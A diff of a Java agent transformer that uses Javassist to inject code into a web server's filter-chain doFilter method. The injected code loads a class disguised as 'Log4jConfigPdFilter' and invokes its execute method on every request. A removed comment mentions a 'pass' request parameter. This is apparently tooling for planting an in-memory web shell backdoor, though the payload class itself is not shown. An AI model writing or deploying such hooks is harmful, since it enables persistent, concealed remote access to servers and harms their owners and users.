@@ -21,8 +21,14 @@ public class MyTransformer implements ClassFileTransformer {
             CtClass cc = pool.makeClass(new ByteArrayInputStream(classFileBuffer));
             CtMethod doFilter = cc.getDeclaredMethod("doFilter");
 
+            try {
+                Class.forName("com.filter.Log4jConfigPdFilter", false, loader);
+                System.out.println("[*] Log4jConfigPdFilter already exists, skipping hook.");
+                return null;
+            } catch (ClassNotFoundException e) {
+                // 类不存在，继续执行 insertBefore
+            }
 
-            // 将如下修改为从$1中调用getParameter("pass")，如果返回值不为空，则执行if中的代码
             doFilter.insertBefore(
                     "{ " +
                             "    System.out.println(\"into doFilter\");" +
@@ -34,9 +40,9 @@ public class MyTransformer implements ClassFileTransformer {
                             "            ClassLoader cl = this.getClass().getClassLoader();" +
                             "            System.out.println(\"ApplicationFilterChain#cl = \" + cl);;" +
                             "            Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
-                            "            java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" + // ✅ FIX 1
+                            "            java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
                             "            Object obj = m.invoke(null, new Object[]{ cl });" +
-                            "            java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +   // ✅ FIX 2
+                            "            java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
                             "            exec.invoke(obj, new Object[]{ req, res });" +
                             "        } catch (Throwable t) { t.printStackTrace(); }" +
                             "        return;" +
